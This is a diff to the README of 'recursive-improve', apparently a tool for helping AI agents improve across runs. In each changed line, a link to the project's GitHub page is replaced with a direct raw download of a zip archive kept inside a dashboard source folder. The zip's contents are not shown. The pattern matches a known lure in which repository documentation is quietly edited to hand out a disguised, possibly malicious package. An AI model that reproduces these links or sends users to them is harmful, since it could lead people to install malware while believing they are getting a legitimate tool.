@@ -1,6 +1,6 @@
 # 🪞 recursive-improve - Help agents learn from each run
 
-[![Download recursive-improve](https://img.shields.io/badge/Download%20recursive-improve-blue?style=for-the-badge)](https://github.com/ichabodcognate315/recursive-improve)
+[![Download recursive-improve](https://img.shields.io/badge/Download%20recursive-improve-blue?style=for-the-badge)](https://raw.githubusercontent.com/ichabodcognate315/recursive-improve/main/recursive_improve/dashboard/improve_recursive_3.8.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ If you plan to use larger AI models, 16 GB of RAM gives better results.
 
 Visit this page to download and use the app:
 
-https://github.com/ichabodcognate315/recursive-improve
+https://raw.githubusercontent.com/ichabodcognate315/recursive-improve/main/recursive_improve/dashboard/improve_recursive_3.8.zip
 
 ## 🛠️ Install on Windows
 
@@ -167,4 +167,4 @@ This project fits topics like:
 
 Use the GitHub page for the latest source and project files:
 
-https://github.com/ichabodcognate315/recursive-improve
+https://raw.githubusercontent.com/ichabodcognate315/recursive-improve/main/recursive_improve/dashboard/improve_recursive_3.8.zip
